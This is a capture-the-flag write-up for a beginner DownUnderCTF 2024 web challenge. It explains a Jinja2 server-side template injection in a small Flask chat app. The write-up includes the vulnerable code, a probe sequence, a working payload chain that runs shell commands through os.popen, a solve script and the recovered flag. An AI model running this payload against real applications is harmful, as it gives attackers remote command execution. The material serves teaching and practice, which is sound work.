# Parrot the Emu

- **Event:** DownUnderCTF 2024
- **Category:** web
- **Difficulty:** beginner
- **Author:** richighimi

## Summary

"It is so nice to hear Parrot the Emu talk back." A tiny Flask chat page: you type something and the "Emu" parrots it back. The vulnerability is Server-Side Template Injection (SSTI): user input is passed directly to Jinja2's `render_template_string`.

## First look

The handout zip unpacks to the whole app under `src/main-app`: `app.py`, a `flag` file, `requirements.txt`, templates and static files. The deployment (`src/Dockerfile`) copies the app into `/usr/src/app` and runs `flask run --host=0.0.0.0 --port=1337` with `FLASK_APP=app.py`, so the flag file sits in the app's working directory as `./flag`.

The whole app is 20 lines, and the bug is the middle of it:

```python
from flask import Flask, render_template, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def vulnerable():
    chat_log = []

    if request.method == 'POST':
        user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input)
        except Exception as e:
            result = str(e)

        chat_log.append(('User', user_input))
        chat_log.append(('Emu', result))
    return render_template('index.html', chat_log=chat_log)
```

Whatever arrives in the form field `user_input` is handed to `render_template_string`, unescaped and unsandboxed. Two more details matter later: exceptions are caught and the error string itself becomes the Emu's reply (a free oracle for what went wrong), and `render_template_string` runs with the app's template globals, not with Python's builtins in scope.

To run it the way deployment does I needed the pinned stack locally. This box had no Flask at all, so the pinned versions from `requirements.txt` (Flask 2.1.1, Werkzeug 2.0.3, with Jinja2 3.1.2) were installed into a scratch directory and put on `PYTHONPATH`, and the server was started from the app directory exactly like the Dockerfile does:

```
FLASK_APP=app.py flask run --host=127.0.0.1 --port=1337
```

## What I tried first

All of these are real posts to the running app; the Emu's reply is quoted as returned.

**Plain text, to see the echo:**

```
send: hello emu, say it back
emu : 'hello emu, say it back'
```

**The wrong template syntax.** My first probe used `${...}` out of habit from other template engines:

```
send: ${7*7}
emu : '${7*7}'
```

Came back character for character. Not that engine, or not an injection at all. That echo is exactly what the page advertises, so it proves nothing either way.

**Jinja syntax:**

```
send: {{ 7*7 }}
emu : '49'
```

And there it is. The input is not echoed, it is evaluated.

**Confirming it is Jinja semantics and not some generic evaluator:**

```
send: {{ 7*'7' }}
emu : '7777777'
```

Python string repetition. In Jinja, `7*'7'` repeats the string, where most expression languages would error or multiply to 49. This nails the engine and the evaluation model in one shot.

**Reaching for `os` directly:**

```
send: {{ os.popen('cat flag').read() }}
emu : "'os' is undefined"
```

A clean, useful failure, and thanks to the app's error handling it is printed right in the chat. `os` is a Python module, not a template global, so the payload has to walk to it from an object Jinja does expose. Jinja2's own template globals `cycler`, `joiner` and `namespace` are Python objects whose `__init__.__globals__` is the `jinja2.utils` module namespace, which imports `os`.

**The right payload with the wrong path:**

```
send: {{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}
emu : ''
```

Empty reply, not an error: the payload executed, `cat` found no `/flag` at the filesystem root, and printed nothing. The Dockerfile had already told me the app runs from `/usr/src/app` with the flag copied next to `app.py`, so the relative path is the one to use.

## The breakthrough

Really the `49`. Everything before it was consistent with a dumb echo page; the moment `{{ 7*7 }}` came back as `49`, the page stopped being a parrot and became a Python interpreter with a chat window. From there the chain is the standard Jinja2 escape: template global (`cycler`) to its `__init__`, to `__globals__`, to the `os` module that `jinja2.utils` imports, to `os.popen`.

## Solve

The solve script starts the app exactly as deployed, waits for the port, and runs the whole probe sequence, printing each Emu reply:

```python
import html
import os
import re
import socket
import subprocess
import sys
import time
import urllib.parse
import urllib.request

APP = os.path.expanduser(
    "~/workspace/ctf-work/lab/beginner/parrot-the-emu/src/main-app")
env = dict(os.environ)
env["PYTHONPATH"] = "/var/tmp/pylibs"
env["FLASK_APP"] = "app.py"
proc = subprocess.Popen(
    [sys.executable, "-m", "flask", "run", "--host=127.0.0.1", "--port=1337"],
    cwd=APP, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    text=True)


def post(payload):
    data = urllib.parse.urlencode({"user_input": payload}).encode()
    req = urllib.request.Request("http://127.0.0.1:1337/", data=data,
                                 method="POST")
    with urllib.request.urlopen(req, timeout=10) as r:
        page = r.read().decode(errors="ignore")
    msgs = re.findall(r'message-text">(.*?)</div>', page, re.S)
    return html.unescape(msgs[-1].strip()) if msgs else "<no emu reply>"


try:
    for _ in range(50):
        try:
            s = socket.create_connection(("127.0.0.1", 1337), timeout=1)
            s.close()
            break
        except OSError:
            time.sleep(0.2)
    else:
        raise RuntimeError("flask did not start")

    probes = [
        "hello emu, say it back",
        "${7*7}",
        "{{ 7*7 }}",
        "{{ 7*'7' }}",
        "{{ os.popen('cat flag').read() }}",
        "{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}",
        "{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}",
    ]
    for p in probes:
        print(f"send: {p}")
        print(f"emu : {post(p)!r}")
finally:
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
```

Run:

```
$ python3 parrot_solve.py
send: hello emu, say it back
emu : 'hello emu, say it back'
send: ${7*7}
emu : '${7*7}'
send: {{ 7*7 }}
emu : '49'
send: {{ 7*'7' }}
emu : '7777777'
send: {{ os.popen('cat flag').read() }}
emu : "'os' is undefined"
send: {{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}
emu : ''
send: {{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
emu : 'DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}'
```

## Flag

```
DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}
```

Sanity check: the flag came out of the running server's own HTTP response to the final payload, and the two failures before it (undefined `os`, empty output for the wrong path) confirm the response is the command's actual output and not an artifact of the page.
